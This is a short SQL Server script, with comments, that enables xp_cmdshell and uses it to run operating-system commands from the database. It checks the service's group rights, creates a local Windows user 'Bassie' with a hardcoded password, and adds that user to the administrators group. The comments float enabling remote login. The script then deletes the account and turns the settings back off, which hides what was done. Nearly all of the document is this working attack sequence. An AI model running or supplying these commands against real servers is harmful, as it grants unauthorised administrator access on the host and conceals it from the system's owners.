-- https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/show-advanced-options-server-configuration-option?view=sql-server-2017
-- https://blog.sqlauthority.com/2010/07/29/sql-server-check-advanced-server-configuration/

-- This setting must be set to 1, hope you have enough rights to do this (or it's already)
EXEC sp_configure 'Show Advanced Options', 1;
-- This setting must be set to 1, hope you have enough rights to do this (or it's already)
exec sp_configure 'xp_cmdshell', 1;
GO
RECONFIGURE;

-- here you can view more settings if you like it
EXEC sp_configure;

-- see if the database is running as an administrator
xp_cmdshell 'whoami /groups';
-- I could also create a user here and give these admin rights.
xp_cmdshell 'net user Bassie Ab12345! /ADD'
xp_cmdshell 'net localgroup administrators Bassie /add'
-- maybe turn on remote login ???


-- clear account (when you're done with it)
xp_cmdshell 'net user Bassie /DELETE'

-- put everything back neatly
EXEC sp_configure 'Show Advanced Options', 0;
exec sp_configure 'xp_cmdshell', 0;
GO
RECONFIGURE;